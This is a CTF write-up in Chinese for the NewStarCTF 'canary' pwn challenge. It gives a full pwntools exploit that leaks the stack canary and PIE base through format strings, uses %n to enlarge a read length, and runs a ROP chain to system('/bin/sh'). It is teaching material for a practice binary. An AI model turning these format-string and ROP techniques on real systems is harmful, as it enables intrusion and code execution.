# Speedrun：NewStarCTF canary

> 题型：ret2text + canary leak + 格式化字符串改长度 + PIE  
> 目标：leak canary / PIE，把全局 `money` 改成 256，最后 `system("/bin/sh")`  
> 关键：offset **40**；canary `%11$p`；PIE `%17$p`；`%9$n` 写 `money`

---

## 0. 一句话结论

```text
main:
  char vivo50[32] @ rbp-0x30          <- 只有 0x20 字节
  canary            @ rbp-0x08
  read(0, vivo50, 0x20)              <- 第一轮：leak
  printf(vivo50)                     <- 格式化字符串读
  read(0, vivo50, 0x20)              <- 第二轮：格式化字符串写
  printf(vivo50)
  read(0, vivo50, money)             <- 第三轮：money = 0x100，栈溢出
  return

  offset to canary = 0x30 - 0x08 = 0x28 = 40
  offset to saved RIP = 40 + 8 + 8 = 56

第一轮:
  %11$p -> canary
  %17$p -> main (PIE leak)

第二轮:
  %256c%9$n + p64(&money)
  -> money = 256
  -> 第三轮 read 长度变成 0x100

第三轮:
  40 'A' + canary + 8 'B' + ret + pop rdi + "/bin/sh" + system@plt
```

二进制里有一个 `backdoor`，但它执行的是：

```c
system("echo 你不是...");
```

不是 shell，是纯干扰项；这题必须自己 leak + ROP。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2text'

file '[NewStarCTF 公开赛赛道]canary/pwn'
checksec --file='[NewStarCTF 公开赛赛道]canary/pwn'
nm -n '[NewStarCTF 公开赛赛道]canary/pwn' | grep -E ' (main|backdoor|init)$'
objdump -d -M intel '[NewStarCTF 公开赛赛道]canary/pwn' | sed -n '/<main>:/,/^$/p'
objdump -d -M intel '[NewStarCTF 公开赛赛道]canary/pwn' | sed -n '/<backdoor>:/,/^$/p'
objdump -s -j .rodata '[NewStarCTF 公开赛赛道]canary/pwn'
```

关键输出：

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
Full RELRO
Canary found
NX enabled
PIE enabled
Not stripped

00000000000009d1 T backdoor
00000000000009e4 T main
```

读法：

| 观察 | 结论 |
| --- | --- |
| PIE enabled | `main` / `system@plt` / `.data`、BSS 地址都要加 PIE base |
| Canary found | 最终栈溢出必须保留 canary |
| `printf(vivo50)` ×2 | 第一次 leak，第二次任意写 |
| 最后一次 `read(0, vivo50, money)` | `money` 是全局变量，可被格式化字符串改大 |
| `backdoor` 里是 `echo ...` | 不是 `system("/bin/sh")`，不能直接 ret2text |
| Full RELRO | GOT 不可写，但这题不需要改 GOT |

`backdoor` 反汇编：

```asm
00000000000009d1 <backdoor>:
  9d1: push   rbp
  9d2: mov    rbp,rsp
  9d5: lea    rdi,[rip+0x17c]        # b58 "echo 你不是..."
  9dc: call   800 <system@plt>
  9e1: nop
  9e2: pop    rbp
  9e3: ret
```

所以看到 `system@plt` 不要高兴太早，参数不是 `/bin/sh`。

---

## 2. 关键逆向

### 2.1 `main` 的三次输入

```asm
00000000000009e4 <main>:
  9e4: push   rbp
  9e5: mov    rbp,rsp
  9e8: sub    rsp,0x30
  9ec: mov    rax,QWORD PTR fs:0x28
  9f5: mov    QWORD PTR [rbp-0x8],rax      ; canary
  ...
  a29: lea    rax,[rbp-0x30]               ; vivo50
  a2d: mov    edx,0x20
  a32: mov    rsi,rax
  a35: mov    edi,0x0
  a3f: call   810 <read@plt>               ; read(0, vivo50, 0x20)

  a44: lea    rax,[rbp-0x30]
  a48: mov    rdi,rax
  a50: call   808 <printf@plt>             ; printf(vivo50)  -> leak

  a61: lea    rax,[rbp-0x30]
  a65: mov    edx,0x20
  a6a: mov    rsi,rax
  a6d: mov    edi,0x0
  a77: call   810 <read@plt>               ; read(0, vivo50, 0x20)

  a7c: lea    rax,[rbp-0x30]
  a80: mov    rdi,rax
  a88: call   808 <printf@plt>             ; printf(vivo50)  -> write

  a8d: mov    edx,DWORD PTR [rip+0x2015d9] # 20206c <money>
  a93: lea    rax,[rbp-0x30]
  a97: mov    rsi,rax
  a9a: mov    edi,0x0
  aa4: call   810 <read@plt>               ; read(0, vivo50, money)
```

等价 C：

```c
char vivo50[32];
int money = 0;

read(0, vivo50, 0x20);
printf(vivo50);
read(0, vivo50, 0x20);
printf(vivo50);
read(0, vivo50, money);   // money 默认 0，但可以被第二次 printf 改
```

栈布局：

```text
rbp-0x30 .. rbp-0x11 : vivo50[32]
rbp-0x10 .. rbp-0x09 : 8 字节 padding（不属于 vivo50）
rbp-0x08 .. rbp-0x01 : canary
rbp+0x00 .. rbp+0x07 : saved rbp
rbp+0x08 .. rbp+0x0f : saved RIP
```

因此：

```text
canary offset = 0x30 - 0x08 = 0x28 = 40
saved RIP offset = 40 + 8 + 8 = 56
```

### 2.2 为什么 `%11$p` 是 canary

在本机 glibc 下实测，`printf` 的参数槽与 `vivo50` 的对应关系是：

| 格式参数 | 指向 |
| --- | --- |
| `%7$p` | `vivo50 + 8` |
| `%8$p` | `vivo50 + 0x10` |
| `%9$p` | `vivo50 + 0x18` |
| `%11$p` | `vivo50 + 0x28` = `rbp-8` = **canary** |
| `%17$p` | 栈上保存的 `main` 指针 = **PIE leak** |

所以第一轮：

```python
p.send(b"%11$p.%17$p\n".ljust(32, b"\x00"))
line = p.recvline().strip()
canary_s, pie_s = line.split(b".", 1)
canary = int(canary_s, 16)
pie = int(pie_s, 16) - MAIN
```

`%17$p` 的返回值等于 `main` 的运行地址；减掉 `main` 的 PIE 内偏移 `0x9e4` 就得到 PIE base。

### 2.3 为什么 `%9$n` 能写 `money`

第二轮把指针放在 `vivo50 + 0x18`：

```python
fmt = b"%256c%9$n".ljust(24, b"A") + p64(pie + MONEY)
```

- `%256c` 先输出 256 个字符；
- `%9$n` 把“已输出字符数”写到第 9 个参数指向的地址；
- 第 9 个参数正好是 `vivo50 + 0x18` 里的 8 字节指针；
- 指针值是 `pie + 0x20206c`，即全局 `money`。

结果：

```text
money = 256
```

第三次 `read(0, vivo50, money)` 于是最多读 256 字节，足够覆盖 saved RIP。

`money` 一开始是 0，所以如果不做这一步，第三次 `read` 长度为 0，栈不会溢出。

---

## 3. Payload 布局

### 3.1 第一轮：leak

```python
payload = b"%11$p.%17$p\n".ljust(32, b"\x00")
```

要点：`read` 读满 0x20；用 `send` 而不是 `sendline`，避免多出来的换行改变栈上数据。

### 3.2 第二轮：写 `money`

```text
offset 0x00..0x17 : "%256c%9$n" + 'A' * 15
offset 0x18..0x1f : p64(pie + 0x20206c)
```

```python
fmt = b"%256c%9$n".ljust(24, b"A") + p64(pie + MONEY)
```

### 3.3 第三轮：ROP

```text
[ 40 字节 'A' ][ canary ][ 8 字节 'B' ][ ret ][ pop rdi ][ "/bin/sh" ][ system@plt ]
```

```python
payload = flat(
    b"A" * OFFSET,
    canary,
    b"B" * 8,
    pie + RET,
    pie + POP_RDI,
    pie + BIN_SH,
    pie + SYSTEM_PLT,
)
```

`ret` 用来维持 `system` 的 16 字节栈对齐；`pop rdi` 把 `/bin/sh` 放进第一个参数。

关键 PIE 内偏移：

| 符号 / gadget | 偏移 | 运行时地址 |
| --- | --- | --- |
| `main` | `0x9e4` | `pie + 0x9e4` |
| `pop rdi; ret` | `0xb33` | `pie + 0xb33` |
| `ret` | `0x7d1` | `pie + 0x7d1` |
| `system@plt` | `0x800` | `pie + 0x800` |
| `"/bin/sh"` | `0x202020` | `pie + 0x202020` |
| `money` | `0x20206c` | `pie + 0x20206c` |

`"/bin/sh"` 在 `.data` 的全局数组 `fake[32]` 里，是二进制静态初始化的字符串；可以直接作为 `system` 参数。

---

## 4. 完整 exp

```python
from pwn import *
import os
import re
import ssl
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./[NewStarCTF 公开赛赛道]canary/pwn"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))

# PIE-relative offsets (the binary is PIE, so add the leaked pie base).
MAIN = 0x9E4
POP_RDI = 0xB33
RET = 0x7D1
SYSTEM_PLT = 0x800
BIN_SH = 0x202020       # char fake[32] = "/bin/sh"
MONEY = 0x20206C        # int money = 0

# main: char vivo50[32] @ rbp-0x30; canary @ rbp-0x8; saved RIP @ rbp+8
OFFSET = 40


def start():
    if args.LOCAL:
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 09_canary_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def exploit():
    p = start()

    # 1) leak canary and a PIE address.
    p.recvuntil(b"Now answer me, will you v me 50\n")
    p.send(b"%11$p.%17$p\n".ljust(32, b"\x00"))
    line = p.recvline(timeout=3).strip()
    canary_s, pie_s = line.split(b".", 1)
    canary = int(canary_s, 16)
    pie = int(pie_s, 16) - MAIN
    log.success(f"canary = {canary:#x}, pie = {pie:#x}")

    # 2) turn money into 0x100 with %256c%9$n.
    fmt = b"%256c%9$n".ljust(24, b"A") + p64(pie + MONEY)
    p.send(fmt)
    p.recvuntil(b"What do you want to say to the canary\n")

    # 3) canary-safe ROP to system("/bin/sh").
    payload = flat(
        b"A" * OFFSET,
        canary,
        b"B" * 8,
        pie + RET,
        pie + POP_RDI,
        pie + BIN_SH,
        pie + SYSTEM_PLT,
    )
    p.send(payload)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
```

本地验证：

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2text'
../.venv/bin/python 09_canary_exp.py LOCAL
```

正确时输出中会出现：

```text
[+] canary = 0x...00, pie = 0x...
__PWNED__
```

`__PWNED__` 出现就说明第三次 `read` 已经溢出、canary 保留正确、ROP 成功进入 `system("/bin/sh")`。

远程：

```bash
HOST=目标IP PORT=目标端口 python 09_canary_exp.py
# 平台要 TLS 时再加 SSL=1
```

---

## 5. 交互坑

1. **第一次 leak 必须用 `send`，不要 `sendline`**  
   `read(0, vivo50, 0x20)` 只读 0x20；多余的换行会留在管道里，被第二次 `read` 吃掉，导致格式串错位。

2. **`%11$p` 不是 `%12$p`**  
   canary 在 `vivo50 + 0x28`；本地实测 `%11$p` 命中。不同 glibc / 编译器可能改变参数槽，先跑一次 `%7$p...%18$p` 确认。

3. **`%9$n` 的指针必须放在 offset 24**  
   `fmt = b"%256c%9$n".ljust(24, b"A") + p64(...)`。  
   如果 `%256c` 的长度或 padding 改了，指针就落到别的参数槽，写不到 `money`。

4. **`money` 必须是 256，不能是别的值**  
   `%256c` 输出 256 个字符，`%n` 写入 256；第三次 `read` 长度就是 256。  
   如果写成 `%128c`，payload 仍然放得下，但 `256` 这个值最直观也最稳。

5. **canary 要原样写回**  
   第三轮 `[40 A][canary][8 B]`；少一个字节或 canary 写错都会在 `__stack_chk_fail` 处退出。

6. **`backdoor` 不是后门**  
   它执行的是 `system("echo 你不是...")`，只打印一句话，不会给 shell。

7. **PIE leak 要页对齐检查**  
   算出 `pie` 后可以检查：

   ```python
   assert pie & 0xFFF == 0
   ```

   不对就说明 `%17$p` 不是 `main`，或者 `MAIN` 偏移填错。

8. **Full RELRO 是干扰项**  
   GOT 只读，但这题既不改 GOT，也不需要 `__free_hook`。

9. **远程协议**  
   默认明文 TCP；CTF² 之类平台设置 `SSL=1`。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec` + `nm`：PIE、canary、`backdoor` 是假后门 |
| 0:20–0:50 | `objdump main`：三次 `read`，第三次长度来自全局 `money` |
| 0:50–1:10 | 试 `%11$p` / `%17$p`：拿 canary 和 PIE |
| 1:10–1:30 | 第二轮 `%256c%9$n` 把 `money` 改成 256 |
| 1:30–1:50 | 第三轮 canary-safe ROP：`ret; pop rdi; /bin/sh; system@plt` |
| 1:50–2:10 | 本地 `LOCAL` 看到 `__PWNED__`，再打远程 |

---

## 7. 题型识别卡

```text
PIE + Canary + printf(user_input)
+ 第三次 read 的长度来自一个全局 int
+ 二进制里 system 的参数不是 /bin/sh
= 先用格式化字符串 leak canary/PIE，再写大全局长度，最后 canary-safe ROP
```

一句话：**`%11$p` 拿 canary，`%17$p` 拿 PIE，`%256c%9$n` 把 `money` 改成 256，最后 40 字节 + canary + `ret/pop rdi//bin/sh/system`。**
